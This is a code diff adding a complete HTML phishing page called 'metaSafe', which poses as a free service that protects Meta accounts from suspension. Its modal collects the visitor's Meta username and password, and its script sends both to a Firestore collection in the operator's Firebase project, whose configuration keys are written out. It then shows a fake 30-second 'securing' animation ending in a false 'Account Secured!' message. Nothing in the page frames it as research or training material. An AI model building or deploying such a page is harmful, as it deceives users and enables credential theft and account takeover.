@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>metaSafe &mdash; Protect Your Account</title>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{
+      --bg:#04070f;--blue:#2563ff;--bl:#4d80ff;
+      --gb:rgba(255,255,255,0.07);--text:#eef2ff;--muted:#7888aa;--ok:#0fd98a;
+    }
+    html{scroll-behavior:smooth}
+    body{font-family:"DM Sans",sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+
+    /* HERO */
+    .hero{position:relative;min-height:100vh;display:flex;flex-direction:column;overflow:hidden}
+    .hero-bg{position:absolute;inset:0;z-index:0}
+    .grid{
+      position:absolute;inset:0;
+      background-image:linear-gradient(rgba(37,99,255,.07) 1px,transparent 1px),linear-gradient(90deg,rgba(37,99,255,.07) 1px,transparent 1px);
+      background-size:56px 56px;
+      mask-image:radial-gradient(ellipse 80% 70% at 50% 40%,black 20%,transparent 80%);
+      animation:gridMove 20s linear infinite
+    }
+    @keyframes gridMove{to{background-position:56px 56px}}
+    .glow{position:absolute;border-radius:50%;filter:blur(80px);pointer-events:none}
+    .g1{width:700px;height:700px;background:radial-gradient(circle,rgba(37,99,255,.2) 0%,transparent 65%);top:-200px;left:50%;transform:translateX(-50%);animation:fa 9s ease-in-out infinite}
+    .g2{width:500px;height:500px;background:radial-gradient(circle,rgba(120,80,255,.12) 0%,transparent 65%);bottom:-60px;right:-120px;animation:fb 12s ease-in-out infinite}
+    .g3{width:320px;height:320px;background:radial-gradient(circle,rgba(37,99,255,.1) 0%,transparent 65%);bottom:200px;left:-80px;animation:fa 15s ease-in-out infinite reverse}
+    @keyframes fa{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(-40px)}}
+    @keyframes fb{0%,100%{transform:translateY(0)}50%{transform:translateY(-30px)}}
+    #particleCanvas{position:absolute;inset:0;pointer-events:none;z-index:1}
+
+    /* NAV */
+    .nav{position:relative;z-index:20;display:flex;align-items:center;justify-content:space-between;padding:26px 52px}
+    .logo{display:flex;align-items:center;gap:10px;font-family:"Syne",sans-serif;font-size:1.35rem;font-weight:700;color:var(--text);user-select:none}
+    .lhex{width:34px;height:34px;background:linear-gradient(135deg,#1a4fff,#4d80ff);clip-path:polygon(50% 0%,95% 25%,95% 75%,50% 100%,5% 75%,5% 25%);display:flex;align-items:center;justify-content:center;font-size:1rem;box-shadow:0 0 18px rgba(37,99,255,.6)}
+    .logo strong{color:var(--bl)}
+    .nav-right{display:flex;align-items:center;gap:12px}
+    .npill{padding:6px 16px;border:1px solid var(--gb);border-radius:100px;font-size:.75rem;color:var(--muted);background:rgba(255,255,255,.03);backdrop-filter:blur(10px)}
+    .admin-link{padding:7px 18px;background:rgba(37,99,255,.12);border:1px solid rgba(37,99,255,.25);border-radius:100px;font-size:.75rem;color:var(--bl);text-decoration:none;transition:background .2s}
+    .admin-link:hover{background:rgba(37,99,255,.22)}
+
+    /* HERO CONTENT */
+    .hcontent{position:relative;z-index:10;flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;gap:28px}
+    .tbadge{display:inline-flex;align-items:center;gap:8px;padding:8px 22px;border-radius:100px;background:rgba(37,99,255,.08);border:1px solid rgba(37,99,255,.22);font-size:.76rem;color:var(--bl);letter-spacing:.06em;text-transform:uppercase;font-weight:500;animation:fu .6s ease both}
+    .bdot{width:6px;height:6px;border-radius:50%;background:var(--bl);box-shadow:0 0 8px var(--bl);animation:blink 2s ease-in-out infinite}
+    @keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+    .htitle{font-family:"Syne",sans-serif;font-size:clamp(2.5rem,6.5vw,4.6rem);font-weight:800;line-height:1.08;max-width:820px;animation:fu .7s .08s ease both;letter-spacing:-.02em}
+    .gt{background:linear-gradient(120deg,#4d80ff 0%,#a78bfa 50%,#38bdf8 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;background-size:200%;animation:gs 5s ease-in-out infinite}
+    @keyframes gs{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+    .hsub{font-size:1.15rem;color:var(--muted);font-weight:300;max-width:500px;line-height:1.65;animation:fu .7s .16s ease both}
+    .ctarow{display:flex;align-items:center;gap:16px;flex-wrap:wrap;justify-content:center;animation:fu .7s .24s ease both}
+    .trust{font-size:.78rem;color:var(--muted);display:flex;align-items:center;gap:6px}
+    .trust b{color:var(--ok);font-weight:400}
+
+    /* FEATURE STRIP */
+    .fstrip{position:relative;z-index:10;display:flex;justify-content:center;border-top:1px solid var(--gb);border-bottom:1px solid var(--gb);background:rgba(255,255,255,.015)}
+    .fi{flex:1;display:flex;align-items:center;justify-content:center;gap:10px;padding:18px 24px;font-size:.82rem;color:var(--muted);border-right:1px solid var(--gb);max-width:240px}
+    .fi:last-child{border-right:none}
+    .scrl{position:relative;z-index:10;display:flex;justify-content:center;padding-bottom:36px}
+    .sl{width:1px;height:52px;background:linear-gradient(to bottom,rgba(37,99,255,.8),transparent);animation:sf 2.5s ease-in-out infinite}
+    @keyframes sf{0%,100%{opacity:.2}50%{opacity:.9}}
+
+    /* BUTTONS */
+    .btn{display:inline-flex;align-items:center;gap:10px;padding:15px 38px;background:linear-gradient(135deg,#1a4fff 0%,#4d80ff 100%);color:#fff;font-family:"DM Sans",sans-serif;font-size:1rem;font-weight:500;border:none;border-radius:100px;cursor:pointer;position:relative;overflow:hidden;transition:transform .2s,box-shadow .2s;box-shadow:0 8px 30px rgba(37,99,255,.45),inset 0 1px 0 rgba(255,255,255,.15)}
+    .btn:hover{transform:translateY(-3px);box-shadow:0 16px 44px rgba(37,99,255,.6)}
+    .btn:active{transform:translateY(0)}
+    .btn.full{width:100%;justify-content:center;border-radius:14px;padding:14px 20px}
+    .ghost{background:transparent;border:none;color:var(--muted);font-family:"DM Sans",sans-serif;font-size:.88rem;cursor:pointer;padding:8px 0;transition:color .2s;display:block;width:100%;text-align:center}
+    .ghost:hover{color:var(--bl)}
+
+    /* MODAL OVERLAY */
+    #modalOverlay{
+      display:none;
+      position:fixed;inset:0;
+      background:rgba(4,7,15,.88);
+      backdrop-filter:blur(16px);
+      -webkit-backdrop-filter:blur(16px);
+      align-items:center;justify-content:center;
+      z-index:9999;padding:20px;
+    }
+    #modalOverlay.show{display:flex}
+
+    .card{
+      background:linear-gradient(160deg,#0c1122 0%,#070b18 100%);
+      border:1px solid rgba(255,255,255,.09);
+      border-radius:26px;padding:44px 40px;
+      width:100%;max-width:450px;
+      box-shadow:0 32px 80px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,255,255,.06);
+      position:relative;
+      animation:cardIn .35s cubic-bezier(.34,1.56,.64,1) both
+    }
+    @keyframes cardIn{from{opacity:0;transform:translateY(24px) scale(.96)}to{opacity:1;transform:translateY(0) scale(1)}}
+    .card::before{content:"";position:absolute;top:0;left:20%;right:20%;height:1px;background:linear-gradient(90deg,transparent,rgba(77,128,255,.6),transparent)}
+
+    /* STEPS */
+    .step{display:flex;flex-direction:column;gap:22px;align-items:center;text-align:center}
+    .step.h{display:none!important}
+    .sico{width:64px;height:64px;border-radius:18px;background:rgba(37,99,255,.1);border:1px solid rgba(37,99,255,.2);display:flex;align-items:center;justify-content:center;font-size:1.9rem;box-shadow:0 0 24px rgba(37,99,255,.15)}
+    .stitle{font-family:"Syne",sans-serif;font-size:1.45rem;font-weight:700;color:var(--text);line-height:1.25}
+    .sdesc{font-size:.88rem;color:var(--muted);line-height:1.55;margin-top:-8px;max-width:300px}
+
+    /* INPUTS */
+    .ig{width:100%;display:flex;flex-direction:column;gap:8px;text-align:left}
+    .ig label{font-size:.74rem;color:var(--muted);font-weight:500;letter-spacing:.06em;text-transform:uppercase}
+    .iw{position:relative}
+    .iw svg{position:absolute;left:15px;top:50%;transform:translateY(-50%);pointer-events:none;opacity:.55}
+    .iw input{width:100%;padding:14px 16px 14px 44px;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.09);border-radius:13px;color:var(--text);font-family:"DM Sans",sans-serif;font-size:.95rem;outline:none;transition:border-color .2s,box-shadow .2s}
+    .iw input::placeholder{color:#2e3a55}
+    .iw input:focus{border-color:var(--blue);background:rgba(37,99,255,.06);box-shadow:0 0 0 3px rgba(37,99,255,.14)}
+    .ierr{font-size:.77rem;color:#ff6b6b;display:none;padding-left:2px}
+    .ierr.show{display:block}
+
+    /* LOADER */
+    .lw{position:relative;width:108px;height:108px;display:flex;align-items:center;justify-content:center}
+    .lsvg{position:absolute;inset:0;width:100%;height:100%;transform:rotate(-90deg)}
+    .ltr{fill:none;stroke:rgba(37,99,255,.12);stroke-width:5}
+    .lfi{fill:none;stroke:url(#blueGrad);stroke-width:5;stroke-linecap:round;stroke-dasharray:283;stroke-dashoffset:283;filter:drop-shadow(0 0 5px #2563ff)}
+    .lfi.spin{animation:arcSpin 30s linear forwards}
+    @keyframes arcSpin{to{stroke-dashoffset:0}}
+    .lic{font-size:2.1rem;animation:ipulse 1.8s ease-in-out infinite;z-index:1}
+    @keyframes ipulse{0%,100%{transform:scale(1)}50%{transform:scale(1.12)}}
+
+    /* PROGRESS DOTS */
+    .pl{width:100%;display:flex;flex-direction:column;gap:13px;text-align:left}
+    .pr{display:flex;align-items:center;gap:12px;font-size:.84rem;color:var(--muted);transition:color .4s}
+    .pr.done{color:var(--text)}
+    .pd{width:11px;height:11px;border-radius:50%;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.13);flex-shrink:0;transition:background .4s,box-shadow .4s}
+    .pd.act{background:var(--blue);box-shadow:0 0 12px var(--blue);animation:dpulse 1s ease-in-out infinite}
+    .pd.ok{background:var(--ok);box-shadow:0 0 10px var(--ok);animation:none}
+    @keyframes dpulse{0%,100%{box-shadow:0 0 6px var(--blue)}50%{box-shadow:0 0 18px var(--bl)}}
+
+    /* SUCCESS */
+    .sw{width:108px;height:108px}
+    .ssvg{width:100%;height:100%;transform:rotate(-90deg)}
+    .sci{fill:none;stroke:var(--ok);stroke-width:5;stroke-dasharray:283;stroke-dashoffset:283;filter:drop-shadow(0 0 8px var(--ok));animation:drawC .9s cubic-bezier(.4,0,.2,1) forwards}
+    .sch{fill:none;stroke:var(--ok);stroke-width:6;stroke-linecap:round;stroke-linejoin:round;stroke-dasharray:70;stroke-dashoffset:70;transform:rotate(90deg);transform-origin:50% 50%;animation:drawK .5s .8s ease forwards}
+    @keyframes drawC{to{stroke-dashoffset:0}}
+    @keyframes drawK{to{stroke-dashoffset:0}}
+    .sttl{color:var(--ok)!important}
+    .spill{display:inline-flex;align-items:center;gap:7px;padding:9px 22px;background:rgba(15,217,138,.08);border:1px solid rgba(15,217,138,.22);border-radius:100px;font-size:.83rem;color:var(--ok);font-weight:500}
+
+    @keyframes fu{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+
+    @media(max-width:640px){
+      .nav{padding:18px 20px}.npill{display:none}.card{padding:32px 22px}.fstrip{display:none}.htitle{font-size:2.1rem}
+    }
+  </style>
+</head>
+<body>
+
+<!-- Firebase SDKs loaded as regular scripts (NOT module) so they're globally available -->
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
+
+<section class="hero">
+  <div class="hero-bg">
+    <div class="grid"></div>
+    <div class="glow g1"></div>
+    <div class="glow g2"></div>
+    <div class="glow g3"></div>
+    <canvas id="particleCanvas"></canvas>
+  </div>
+
+  <nav class="nav">
+    <div class="logo">
+      <div class="lhex">&#11042;</div>
+      meta<strong>Safe</strong>
+    </div>
+    <div class="nav-right">
+      <div class="npill">&#128274; Account Protection</div>
+      <a href="admin.html" class="admin-link">Admin &#8594;</a>
+    </div>
+  </nav>
+
+  <div class="hcontent">
+    <div class="tbadge"><span class="bdot"></span>&nbsp;Live Protection System</div>
+    <h1 class="htitle">
+      Save Your Account From<br/>
+      <span class="gt">Getting Suspended</span>
+    </h1>
+    <p class="hsub">Protect and secure your meta account instantly. One click is all it takes.</p>
+    <div class="ctarow">
+      <button class="btn" id="getStartedBtn">
+        Get Started
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+      </button>
+      <div class="trust"><b>&#10003;</b>&nbsp;Free &middot; Instant &middot; Secure</div>
+    </div>
+  </div>
+
+  <div class="fstrip">
+    <div class="fi">&#9889; Instant Protection</div>
+    <div class="fi">&#128274; 100% Secure</div>
+    <div class="fi">&#128737; Anti-Suspension</div>
+    <div class="fi">&#9989; Verified System</div>
+  </div>
+  <div class="scrl"><div class="sl"></div></div>
+</section>
+
+<!-- MODAL -->
+<div id="modalOverlay">
+  <div class="card" id="modalCard">
+
+    <svg width="0" height="0" style="position:absolute;pointer-events:none">
+      <defs>
+        <linearGradient id="blueGrad" x1="0%" y1="0%" x2="100%" y2="0%">
+          <stop offset="0%" stop-color="#2563ff"/>
+          <stop offset="100%" stop-color="#a78bfa"/>
+        </linearGradient>
+      </defs>
+    </svg>
+
+    <!-- STEP 1 -->
+    <div class="step" id="step1">
+      <div class="sico">&#128100;</div>
+      <div class="stitle">Enter your meta Username</div>
+      <div class="sdesc">We will use this to locate and protect your account from suspension.</div>
+      <div class="ig">
+        <label>Username</label>
+        <div class="iw">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#4d80ff" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
+          <input type="text" id="usernameInput" placeholder="e.g. zaid_meta" autocomplete="off"/>
+        </div>
+        <span class="ierr" id="usernameErr">Please enter your username.</span>
+      </div>
+      <button class="btn full" id="step1Btn">
+        Continue &nbsp;
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+      </button>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="step h" id="step2">
+      <div class="sico">&#128272;</div>
+      <div class="stitle">Enter your meta Password</div>
+      <div class="sdesc">Your password helps us verify your account ownership securely.</div>
+      <div class="ig">
+        <label>Password</label>
+        <div class="iw">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#4d80ff" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          <input type="password" id="useridInput" placeholder="&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;" autocomplete="off"/>
+        </div>
+        <span class="ierr" id="useridErr">Please enter your password.</span>
+      </div>
+      <button class="btn full" id="step2Btn">&#11088;&nbsp; Secure My Account</button>
+      <button class="ghost" id="backBtn">&#8592; Go Back</button>
+    </div>
+
+    <!-- STEP 3 -->
+    <div class="step h" id="step3">
+      <div class="lw">
+        <svg class="lsvg" viewBox="0 0 100 100">
+          <circle class="ltr" cx="50" cy="50" r="45"/>
+          <circle class="lfi" id="loaderArc" cx="50" cy="50" r="45"/>
+        </svg>
+        <div class="lic">&#128272;</div>
+      </div>
+      <div class="stitle" id="loadTitle">Processing your request...</div>
+      <div class="sdesc"  id="loadDesc">Please wait while we secure your account.</div>
+      <div class="pl">
+        <div class="pr" id="prog1"><div class="pd act"></div><span>Verifying identity</span></div>
+        <div class="pr" id="prog2"><div class="pd"></div><span>Scanning account status</span></div>
+        <div class="pr" id="prog3"><div class="pd"></div><span>Applying protection layer</span></div>
+        <div class="pr" id="prog4"><div class="pd"></div><span>Finalizing security shield</span></div>
+      </div>
+    </div>
+
+    <!-- STEP 4 -->
+    <div class="step h" id="step4">
+      <div class="sw">
+        <svg class="ssvg" viewBox="0 0 100 100">
+          <circle class="sci" cx="50" cy="50" r="45"/>
+          <polyline class="sch" points="28,52 44,68 72,34"/>
+        </svg>
+      </div>
+      <div class="stitle sttl">Account Secured! &#127881;</div>
+      <div class="sdesc">Your account has been secured successfully. You are fully protected from suspension.</div>
+      <div class="spill">&#9989; Status: Protected &amp; Active</div>
+      <button class="btn full" id="doneBtn">Done</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// Wait for full DOM + Firebase SDK
+window.addEventListener("load", function() {
+
+  // --- Firebase init (compat SDK = no modules needed) ---
+  firebase.initializeApp({
+    apiKey:            "AIzaSyD_Gw2BENhB_AUWm314Cd56zbym6rpYCoM",
+    authDomain:        "metasafe-9c818.firebaseapp.com",
+    databaseURL:       "https://metasafe-9c818-default-rtdb.firebaseio.com",
+    projectId:         "metasafe-9c818",
+    storageBucket:     "metasafe-9c818.firebasestorage.app",
+    messagingSenderId: "577483260063",
+    appId:             "1:577483260063:web:875fae11c07bc3f5eae2aa",
+    measurementId:     "G-0VVJ9HQHYE"
+  });
+  var db = firebase.firestore();
+
+  // --- Particles ---
+  var canvas = document.getElementById("particleCanvas");
+  var ctx    = canvas.getContext("2d");
+  var W, H;
+  function resize() { W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; }
+  resize();
+  window.addEventListener("resize", resize);
+  var pts = [];
+  for (var i = 0; i < 55; i++) {
+    pts.push({
+      x:  Math.random() * window.innerWidth,
+      y:  Math.random() * window.innerHeight,
+      r:  0.5 + Math.random() * 1.5,
+      vy: -(0.2 + Math.random() * 0.5),
+      vx: (Math.random() - 0.5) * 0.15,
+      ma: 0.25 + Math.random() * 0.4,
+      ph: Math.random() * Math.PI * 2
+    });
+  }
+  function drawParticles() {
+    ctx.clearRect(0, 0, W, H);
+    var t = Date.now() / 1000;
+    pts.forEach(function(p) {
+      p.y += p.vy; p.x += p.vx;
+      if (p.y < -10) { p.y = H + 10; p.x = Math.random() * W; }
+      var a = p.ma * (0.5 + 0.5 * Math.sin(t * 0.8 + p.ph));
+      ctx.beginPath();
+      ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+      ctx.fillStyle = "rgba(77,128,255," + a + ")";
+      ctx.fill();
+    });
+    requestAnimationFrame(drawParticles);
+  }
+  drawParticles();
+
+  // --- State ---
+  var uname = "", uid = "";
+  var overlay = document.getElementById("modalOverlay");
+  var allSteps = [
+    document.getElementById("step1"),
+    document.getElementById("step2"),
+    document.getElementById("step3"),
+    document.getElementById("step4")
+  ];
+
+  function showStep(el) {
+    allSteps.forEach(function(s) { s.classList.add("h"); });
+    el.classList.remove("h");
+  }
+
+  function openModal() {
+    overlay.classList.add("show");
+    // Re-create card animation
+    var card = document.getElementById("modalCard");
+    card.style.animation = "none";
+    void card.offsetWidth;
+    card.style.animation = "cardIn .35s cubic-bezier(.34,1.56,.64,1) both";
+    showStep(allSteps[0]);
+  }
+
+  function closeModal() {
+    overlay.classList.remove("show");
+    setTimeout(resetAll, 350);
+  }
+
+  // --- Button listeners ---
+document.getElementById("getStartedBtn").addEventListener("click", openModal);
+  document.getElementById("doneBtn").addEventListener("click", closeModal);
+
+  overlay.addEventListener("click", function(e) {
+    if (e.target === overlay) closeModal();
+  });
+
+  document.getElementById("step1Btn").addEventListener("click", function() {
+    var v = document.getElementById("usernameInput").value.trim();
+    var e = document.getElementById("usernameErr");
+    if (!v) { e.classList.add("show"); document.getElementById("usernameInput").focus(); return; }
+    e.classList.remove("show");
+    uname = v;
+    showStep(allSteps[1]);
+  });
+
+  document.getElementById("step2Btn").addEventListener("click", function() {
+    var v = document.getElementById("useridInput").value.trim();
+    var e = document.getElementById("useridErr");
+    if (!v) { e.classList.add("show"); document.getElementById("useridInput").focus(); return; }
+    e.classList.remove("show");
+    uid = v;
+    showStep(allSteps[2]);
+    runLoader();
+    // Save to Firestore
+    db.collection("accounts").add({
+      username:  uname,
+      userid:    uid,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+      status:    "Account Added"
+    }).catch(function(err) { console.error("Firestore:", err); });
+  });
+
+  document.getElementById("backBtn").addEventListener("click", function() {
+    showStep(allSteps[0]);
+  });
+
+  // Keyboard enter support
+  document.getElementById("usernameInput").addEventListener("keydown", function(e) {
+    if (e.key === "Enter") document.getElementById("step1Btn").click();
+  });
+  document.getElementById("useridInput").addEventListener("keydown", function(e) {
+    if (e.key === "Enter") document.getElementById("step2Btn").click();
+  });
+
+  // --- 30 second loader ---
+  function runLoader() {
+    var arc = document.getElementById("loaderArc");
+    arc.classList.remove("spin");
+    void arc.offsetWidth;
+    arc.classList.add("spin");
+
+    var rows = ["prog1","prog2","prog3","prog4"].map(function(id) { return document.getElementById(id); });
+    var msgs = [
+      { t: "Verifying identity...",         d: "Checking your username and ID." },
+      { t: "Scanning account status...",    d: "Looking for any suspension flags." },
+      { t: "Applying protection layer...",  d: "Activating your security shield." },
+      { t: "Finalizing security shield...", d: "Almost done, please wait." }
+    ];
+
+    [0, 7500, 15000, 22500].forEach(function(ms, i) {
+      setTimeout(function() {
+        if (i > 0) {
+          var prev = rows[i-1].querySelector(".pd");
+          prev.classList.remove("act"); prev.classList.add("ok");
+          rows[i-1].classList.add("done");
+        }
+        rows[i].querySelector(".pd").classList.add("act");
+        document.getElementById("loadTitle").textContent = msgs[i].t;
+        document.getElementById("loadDesc").textContent  = msgs[i].d;
+      }, ms);
+    });
+
+    setTimeout(function() {
+      var last = rows[3].querySelector(".pd");
+      last.classList.remove("act"); last.classList.add("ok");
+      rows[3].classList.add("done");
+    }, 29500);
+
+    setTimeout(function() { showStep(allSteps[3]); }, 30000);
+  }
+
+  // --- Reset ---
+  function resetAll() {
+    document.getElementById("usernameInput").value = "";
+    document.getElementById("useridInput").value   = "";
+    document.getElementById("usernameErr").classList.remove("show");
+    document.getElementById("useridErr").classList.remove("show");
+    uname = ""; uid = "";
+    ["prog1","prog2","prog3","prog4"].forEach(function(id, i) {
+      var row = document.getElementById(id);
+      var dot = row.querySelector(".pd");
+      dot.classList.remove("act","ok");
+      row.classList.remove("done");
+      if (i === 0) dot.classList.add("act");
+    });
+    showStep(allSteps[0]);
+  }
+
+});
+</script>
+
+<!--
+==============================================
+FIREBASE CONFIG REFERENCE
+==============================================
+import { initializeApp } from "firebase/app";
+import { getAnalytics }  from "firebase/analytics";
+const firebaseConfig = {
+  apiKey:            "AIzaSyD_Gw2BENhB_AUWm314Cd56zbym6rpYCoM",
+  authDomain:        "metasafe-9c818.firebaseapp.com",
+  databaseURL:       "https://metasafe-9c818-default-rtdb.firebaseio.com",
+  projectId:         "metasafe-9c818",
+  storageBucket:     "metasafe-9c818.firebasestorage.app",
+  messagingSenderId: "577483260063",
+  appId:             "1:577483260063:web:875fae11c07bc3f5eae2aa",
+  measurementId:     "G-0VVJ9HQHYE"
+};
+const app       = initializeApp(firebaseConfig);
+const analytics = getAnalytics(app);
+==============================================
+-->
+</body>
+</html>
